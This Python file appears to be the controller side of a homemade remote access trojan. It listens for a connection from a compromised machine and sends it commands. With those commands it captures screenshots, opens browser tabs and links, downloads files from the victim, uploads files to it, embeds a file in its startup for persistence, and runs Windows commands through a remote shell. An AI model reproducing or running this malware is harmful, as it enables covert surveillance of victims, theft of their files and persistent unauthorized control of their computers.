import socket
import sys
import os
import pickle
s = socket.socket()
print("Socket Successfully created")
loot = r"C:\loot"
#Reserves port 12345
port = 12345
yessir = 0
#Next bind to the port
#Still no ip instead its an empty string, makes the computer listen to request
#From other computers on the network
s.bind(("", port))
#Put the socket into listening mode
s.listen(5)
print("Socket is listening")
#Establish a connection with client
c, addr = s.accept()
print("Got a connection from ", addr)
f = r"C:\Screenshots\Screenshot.png"
ScreenShot_Number = 0
while True:
    x = input("Enter your command : ")
    xby = str.encode(x)
    c.send(xby)
    #webbrowser.open_new(r"C:\Screenshots\Screenshot{}.png".format(scnum))
    if(x == "chromespam"):
        chrmx = input("How many do you want to open?")
        chrmx = str.encode(chrmx)
        c.send(chrmx)
    if(x == "screenshot"):
        scfilesz = str(c.recv(1024).decode("utf-8"))
        print(scfilesz)
        scfilesz = int(scfilesz)
        with open(f'Recv_Screenshot{ScreenShot_Number}.png', 'wb') as f:
            print ('file opened')
            scfilesz = scfilesz/1024
            #scfilesz = scfilesz + 1
            print(scfilesz)
            while (yessir < scfilesz):
                data = c.recv(1024)
                if not data:
                    break
                # write data to a file
                f.write(data)
                yessir = yessir + 1

            f.close()
            yessir = 0
            ScreenShot_Number = ScreenShot_Number + 1
    elif(x == "anylink"):
        link = input("Paste the link you want to have open : ")
        link = str.encode(link)
        c.send(link)
    elif(x == "help"):
        print("chromespam == opens however many chrome tabs you want")
        print("anylink == opens whatever link you input")
        print("screenshot == takes a screenshot and sends it back")
        print("shell == UNDER DEVELOPMENT allows you to enter shell commands")
    elif(x == "shell"):
        shcmd = ""
        cwd = ""
        inp = ""
        while(shcmd != "disconnect"):
            cwd = c.recv(1024)
            inp = cwd.decode("utf-8")
            shcmd = input(inp + " : ")
            c.send(str.encode(shcmd))
            if(shcmd == "ls" or shcmd == "dir"):
                print(pickle.loads(c.recv(11000)))
            elif(shcmd == "help"):
                print("ls or dir to see files and folders in active directory")
                print("Cd to navigate around filesystem, to change drive its cd X:")
                print("Download then input the name to download a file")
                print("Upload then input the name to upload a file")
                print("Startup embeds file on your computer into other computers startup")
                print("CMD allows you to use windows commands without output")
            elif(shcmd == "download"):
                dfile = input("What file do you want to download? : ")
                c.send(str.encode(dfile))
                dnfilesz = c.recv(1024).decode("utf-8")
                print(dnfilesz+"ye")
                ############################################
                print(dnfilesz)
                dnfilesz = int(dnfilesz)
                with open(f'{dfile}', 'wb') as f:
                    print('file opened')
                    dnfilesz = dnfilesz/1024
                    print(dnfilesz)
                    yessir = 0
                    while (yessir < dnfilesz):
                        data = c.recv(1024)
                        if not data:
                            break
                        f.write(data)
                        yessir = yessir + 1
                    f.close()
                    break
            elif(shcmd == "upload"):
                dfile = input("What file would you like to upload : ")
                dfilesz = os.stat(rf"{dfile}")
                #print(dfilesz)
                #dfilesz =
                c.send(str.encode(str(dfilesz.st_size)))
                c.send(str.encode(dfile))
                dfilesz = dfilesz.st_size
                dfilesz = dfilesz/1024
                filename=rf"{dfile}"
                f = open(filename,'rb')
                l = f.read(1024)
                yessir = 0
                while(yessir < dfilesz):
                    c.send(l)
                    l = f.read(1024)
                    yessir = yessir + 1
                f.close()
                break
            elif(shcmd == "startup"):
                dfile = input("What file do you want to embed in startup? : ")
                dfilesz = os.stat(rf"{dfile}")
                #print(dfilesz)
                #dfilesz =
                c.send(str.encode(str(dfilesz.st_size)))
                c.send(str.encode(dfile))
                dfilesz = dfilesz.st_size
                dfilesz = dfilesz/1024
                filename=rf"{dfile}"
                f = open(filename,'rb')
                l = f.read(1024)
                yessir = 0
                while(yessir < dfilesz):
                    c.send(l)
                    l = f.read(1024)
                    yessir = yessir + 1
                f.close()
                break
            elif(shcmd == "cmd"):
                sndcmd = input("What command do you want to use? : ")
                c.send(str.encode(str(sndcmd)))
                print(c.recv(1024).decode("utf-8"))
            else:
                pass
    else:
        pass
    #s.recv(1024).decode("utf-8")
